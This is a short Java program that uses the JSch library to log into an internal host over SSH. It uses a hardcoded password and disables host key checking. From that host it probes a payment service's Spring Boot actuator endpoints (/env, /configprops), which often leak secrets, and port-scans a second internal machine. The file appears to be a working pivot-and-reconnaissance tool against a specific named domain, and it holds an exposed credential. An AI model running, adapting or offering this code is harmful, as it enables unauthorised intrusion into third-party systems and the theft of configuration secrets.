import com.jcraft.jsch.*;
import java.io.*;
class SSHX {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    ch.setCommand("curl -sk https://payment.accurate.id/ 2>/dev/null | head -5;echo ---ACTUATOR---;curl -sk https://payment.accurate.id/actuator/env 2>/dev/null | head -100;echo ---CONFIGPROPS---;curl -sk https://payment.accurate.id/actuator/configprops 2>/dev/null | head -50;echo ---INTERNAL---;curl -sk http://10.14.16.50:8080/ 2>/dev/null | head -5;echo ---INTERNAL2---;curl -sk http://10.14.16.50:8443/ 2>/dev/null | head -5;for p in 8080 8443 9090 8888 80 443; do curl -sk --max-time 2 -o /dev/null -w \"10.14.16.50:$p=%{http_code} \" http://10.14.16.50:$p 2>/dev/null; done");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
